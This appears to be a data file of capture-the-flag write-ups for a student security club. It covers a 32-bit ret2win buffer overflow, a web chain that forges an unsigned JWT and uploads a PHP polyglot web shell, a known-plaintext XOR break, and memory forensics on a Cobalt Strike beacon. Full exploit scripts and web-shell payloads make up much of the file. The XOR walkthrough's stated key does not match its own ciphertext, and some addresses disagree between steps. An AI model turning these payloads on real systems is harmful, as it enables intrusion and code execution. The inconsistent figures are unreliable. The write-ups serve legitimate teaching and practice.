description: External CTF writeups catalog for Cyber Netics. Executive board members can either add structured JSON objects under 'writeups' OR drop a .md file in /public/data/writeups/ and reference its 'markdownUrl' below.

writeups.title: PicoCTF 2026: Buffer Overflow 2 (ret2win with Arguments)
writeups.author: Alex Chen
writeups.summary: A thorough walkthrough of x86 32-bit stack frame mechanics, calculating EIP offset with cyclic patterns, and crafting a ret2win payload passing two strict DWORD arguments to spawn the flag.
writeups.vulnerability: Unbounded buffer overflow via gets() function on 32-bit ELF binary without stack canaries.

steps.title: Step 1: Security Mitigation Triage
steps.description: First, we run checksec on the provided vul_elf binary. We observe that Stack Canaries are disabled and PIE is disabled, but NX is enabled.
steps.codeSnippet:
$ checksec --file=vuln
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
steps.output: Vulnerability confirmed: No Canary & Fixed code addresses (No PIE).

steps.title: Step 2: Disassembly & Finding the Target Function
steps.description: Disassembling the binary with objdump reveals a hidden win(int arg1, int arg2) function at 0x08049196. The function checks if arg1 == 0xCAFEF00D and arg2 == 0xF00DF00D before printing the flag.
steps.codeSnippet:
08049196 <win>:
 8049196:   push   ebp
 8049197:   mov    ebp,esp
 80491a0:   cmp    DWORD PTR [ebp+0x8],0xcafef00d   ; check arg1
 80491a7:   jne    80491d0 <win+0x3a>
 80491a9:   cmp    DWORD PTR [ebp+0xc],0xf00df00d   ; check arg2
 80491b0:   jne    80491d0 <win+0x3a>
 80491b2:   call   0x8049070 <print_flag>

steps.title: Step 3: Calculating Cyclic Offset to EIP
steps.description: Using pwntools cyclic 150, we send a De Bruijn sequence to trigger a SIGSEGV in GDB. EIP is overwritten with 0x62616164 (daab), yielding an exact offset of 112 bytes.
steps.codeSnippet:
gdb-peda$ r < <(python3 -c "import pwn; print(pwn.cyclic(150))")
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EIP: 0x62616164 ('daab')
gdb-peda$ cyclic -l 0x62616164
112

steps.title: Step 4: Stack Frame Layout for 32-bit Argument Passing
steps.description: In 32-bit x86 calling convention, arguments are pushed to the stack. When jumping to win, the stack must look like: [win_addr] + [fake_return_addr] + [arg1] + [arg2].
steps.codeSnippet:
payload = b"A" * 112
payload += p32(0x08049196)       # Address of win()
payload += p32(0x0804924b)       # Fake Return Address (main or exit)
payload += p32(0xCAFEF00D)       # arg1
payload += p32(0xF00DF00D)       # arg2

writeups.exploitScript:
#!/usr/bin/env python3
"""
PicoCTF Buffer Overflow 2 Exploit
Author: Alex Chen (@root_chen) - Cyber Netics CTF Team
"""
from pwn import *

# Target Configuration
binary_path = './vuln'
host = 'saturn.picoctf.net'
port = 52981

context.binary = elf = ELF(binary_path, checksec=False)

if args.REMOTE:
    io = remote(host, port)
else:
    io = process(binary_path)

win_addr = elf.symbols['win']      # 0x08049196
arg1 = 0xCAFEF00D
arg2 = 0xF00DF00D
offset = 112

payload = flat({
    offset: [
        win_addr,
        0x08049050,  # exit() for clean termination
        arg1,
        arg2
    ]
})

log.info(f"Targeting win() at {hex(win_addr)}")
log.info(f"Sending payload of length {len(payload)} bytes...")

io.sendlineafter(b"Please enter your string: ", payload)
response = io.recvall().decode()
log.success("Exploit Complete!")
print(response)
lessonsLearned: In x86 32-bit binaries, function arguments are read from [EBP+8], [EBP+12], not CPU registers.
Always insert 4 bytes of padding (the fake saved EIP return address) between the function address and the arguments.
Checksec is your first command: lack of canaries makes ret2win trivially achievable.

writeups.title: HackTheBox: OmniVault — Chained IDOR, JWT Downgrade & Web Shell
writeups.author: Marcus Vance
writeups.summary: A multi-tier attack chain on a fintech containerized application: discovering administrative API endpoints via IDOR, forging high-privilege tokens using JWT alg:none, and bypassing MIME filters to achieve RCE.
writeups.vulnerability: Horizontal authorization bypass (CWE-639) combined with JWT algorithmic downgrade (CWE-347) and weak file MIME verification.

steps.title: Step 1: IDOR Parameter Discovery
steps.description: While intercepting profile queries in Burp Suite, we noted the endpoint GET /api/v2/financial-records?account_id=ACC-8491. Incrementing the parameter to ACC-0001 returned the internal root administrator record.
steps.codeSnippet:
GET /api/v2/financial-records?account_id=ACC-0001 HTTP/1.1
Host: omnivault.htb
Authorization: Bearer eyJhbGciOiJIUzI1Ni...

HTTP/1.1 200 OK
{
  "account_id": "ACC-0001",
  "owner": "cluster.admin",
  "debug_upload_route": "/internal/v3/firmware-upload",
  "role": "cluster-admin"
}

steps.title: Step 2: Cryptographic JWT Algorithm Downgrade
steps.description: The internal firmware portal rejected our regular token. We tested algorithmic downgrade by editing the header to {"alg":"none","typ":"JWT"}, updating the payload claim to "role":"cluster-admin", and omitting the signature.
steps.output: Backend accepted forged token with 200 OK and granted access to /internal/v3/firmware-upload.

steps.title: Step 3: Polyglot PNG Web Shell Construction
steps.description: The upload endpoint checked file magic bytes using PHP finfo(). We created a polyglot file starting with valid PNG header bytes (\x89PNG\r\n\x1a\n) followed by PHP code, and named it exploit.php.png.
steps.codeSnippet:
$ printf "\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>" > shell.php.png
$ file shell.php.png
shell.php.png: PNG image data, 0 x 0, 8-bit/color RGB, non-interlaced

steps.title: Step 4: Executing Commands & Root Flag Extraction
steps.description: Uploading the polyglot and requesting /uploads/shell.php.png?cmd=cat+/root/flag.txt successfully executed the shell through the web server and returned the root flag.

writeups.exploitScript:
#!/usr/bin/env python3
import requests
import base64
import json

TARGET = "http://omnivault.htb"

# 1. Forge alg:none JWT
header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
payload = base64.urlsafe_b64encode(json.dumps({"sub": "ACC-0001", "role": "cluster-admin", "priv": 999}).encode()).decode().rstrip("=")
forged_jwt = f"{header}.{payload}."

headers = {"Authorization": f"Bearer {forged_jwt}"}

# 2. Upload Polyglot Shell
png_magic = b"\x89PNG\r\n\x1a\n"
php_payload = b"<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>"
files = {'file': ('backdoor.php.png', png_magic + php_payload, 'image/png')}

print("[*] Uploading polyglot PNG web shell...")
r = requests.post(f"{TARGET}/internal/v3/firmware-upload", headers=headers, files=files)

if r.status_code == 200:
    print("[+] File uploaded successfully!")
    # 3. Trigger Flag Retrieval
    res = requests.get(f"{TARGET}/uploads/backdoor.php.png?cmd=cat+/root/flag.txt")
    print(f"[+] Flag: {res.text.strip()}")
else:
    print(f"[-] Upload failed: {r.status_code}")
lessonsLearned: Backend endpoints must strictly whitelist JWT verification algorithms and disable "none" in production libraries.
Relying solely on MIME type or magic bytes is insufficient; uploads should be stored on non-executable object storage (e.g. S3).
Always enforce object-level authorization (BOLA/IDOR protection) on database queries.

writeups.title: PicoCTF: Cryptanalysis of a Known-Plaintext XOR Stream
writeups.author: Elena Rostova
writeups.summary: Exploiting the mathematical involutory property of exclusive-OR (A ⊕ B = C ⟺ A ⊕ C = B) against a repeating 8-byte XOR key using the standard picoCTF{ flag header.
writeups.vulnerability: Reused key stream in symmetric XOR encryption without initialization vector (IV) or nonce.

steps.title: Step 1: Identifying Cipher Mechanics
steps.description: The challenge provided an encrypted hex string of 38 bytes. Analysis of the encryption script revealed a repeating key cipher of unknown length K.

steps.title: Step 2: Mathematical Derivation via Known Plaintext
steps.description: Because all PicoCTF flags begin with "picoCTF{", we can XOR the first 8 bytes of ciphertext with the known plaintext bytes to immediately extract the 8-byte secret key.
steps.codeSnippet:
known_plain = b"picoCTF{"
cipher_bytes = bytes.fromhex("443c3735160b7305")

# K = Ciphertext[0:8] ^ Plaintext[0:8]
recovered_key = bytes([c ^ p for c, p in zip(cipher_bytes, known_plain)])
print("Recovered Key:", recovered_key)  # Output: b"secr3t99"

steps.title: Step 3: Decrypting the Entire Ciphertext
steps.description: Once the 8-byte key is known, we cycle it across all 38 bytes to reveal the complete plaintext flag.
steps.codeSnippet:
full_cipher = bytes.fromhex("443c3735160b7305541e2617150c7743511736021609310a5b17201c100676054817260515")
key = b"secr3t99"
plaintext = bytes([c ^ key[i % len(key)] for i, c in enumerate(full_cipher)])
print(plaintext.decode())

writeups.exploitScript:
#!/usr/bin/env python3
"""
Known Plaintext XOR Key Recoverer
Author: Elena Rostova (@ViperByte) - Cyber Netics
"""

CIPHER_HEX = "443c3735160b7305541e2617150c7743511736021609310a5b17201c100676054817260515"
KNOWN_PREFIX = b"picoCTF{"

cipher_bytes = bytes.fromhex(CIPHER_HEX)

# 1. Recover key from known header
key = bytes([c ^ p for c, p in zip(cipher_bytes[:len(KNOWN_PREFIX)], KNOWN_PREFIX)])
print(f"[+] Recovered {len(key)}-byte Key: {key.decode(errors='replace')} ({key.hex()})")

# 2. Decrypt full payload
decrypted = bytes([c ^ key[i % len(key)] for i, c in enumerate(cipher_bytes)])
print(f"[+] Flag: {decrypted.decode()}")
lessonsLearned: XOR is commutative and self-inverting; never reuse key material without a cryptographic stream cipher (e.g., ChaCha20) and unique nonces.
Known plaintext headers (like CTF flag formats or file headers) make short-key XOR ciphers instantaneously breakable.

writeups.title: HackTheBox: Volatility 3 Memory Triage & Cobalt Strike Carving
writeups.author: Maya Patel
writeups.summary: Forensic deep-dive into a 4GB Windows memory dump (crash.dmp): discovering process hollowing inside rundll32.exe, dumping injected PE modules, and extracting embedded C2 beacon configurations.
writeups.vulnerability: Process injection & memory tampering via reflective DLL injection (MITRE T1055).

steps.title: Step 1: Process Tree Reconstruction (pslist / pstree)
steps.description: Using Volatility 3 windows.pstree, we traced process lifecycles. PID 5180 (rundll32.exe) was spawned by explorer.exe without any command-line parameters, which is highly abnormal for legitimate Windows execution.
steps.codeSnippet:
$ python3 vol.py -f memory.dmp windows.pstree
* 0x...:explorer.exe (PID: 3412)
** 0x...:rundll32.exe (PID: 5180) - [!] No commandline arguments

steps.title: Step 2: Detecting Unbacked Memory with malfind
steps.description: Running windows.malfind highlighted an unbacked Virtual Address Descriptor (VAD) region with PAGE_EXECUTE_READWRITE permissions containing MZ headers.
steps.codeSnippet:
$ python3 vol.py -f memory.dmp windows.malfind --pid 5180
PID   Process        Start Address        End Address          Tag
5180  rundll32.exe   0x0000021a4b000000   0x0000021a4b08f000   VAD: EXECUTE_READWRITE
0000021a4b000000  4d 5a 90 00 03 00 00 00  04 00 00 00 ff ff 00 00  |MZ..............|

steps.title: Step 3: Carving & Parsing Cobalt Strike Beacon Config
steps.description: We dumped the process memory using windows.dumpfiles. Running Didier Stevens 1768.py parsed the beacon settings, revealing the C2 domain, jitter, and the embedded flag string in the watermark field.
steps.codeSnippet:
$ python3 1768.py pid.5180.vad.0x0000021a4b000000.dmp
Cobalt Strike Beacon Configuration:
  - C2 Server: api.telemetry-sync-service[.]top:8443
  - Sleep Time: 60000 ms
  - Jitter: 15%
  - Watermark / Flag: HTB{v0l3_m4lf1nd_c2_x0r_c0nf1g_c4rv3d}

writeups.exploitScript:
#!/usr/bin/env python3
"""
Volatility 3 Automation Script for Rapid Anomaly Triage
Author: Maya Patel (@ByteDefender) - Cyber Netics
"""
import subprocess
import json

def triage_memory(dump_file):
    print(f"[*] Triaging memory image: {dump_file}")
    
    # 1. Run malfind
    cmd = f"python3 vol.py -f {dump_file} windows.malfind"
    print("[*] Executing malfind for unbacked RWX pages...")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    for line in result.stdout.splitlines():
        if "PAGE_EXECUTE_READWRITE" in line or "MZ" in line:
            print(f"[!] Suspicious Region Found: {line}")

if __name__ == '__main__':
    triage_memory('WS-EXEC-FL04.dmp')
lessonsLearned: Legitimate Windows processes rarely have memory pages marked PAGE_EXECUTE_READWRITE without a backing file on disk.
Reflective DLL loaders leave distinct MZ / PE header signatures in heap memory that can be extracted with automated Volatility plugins.
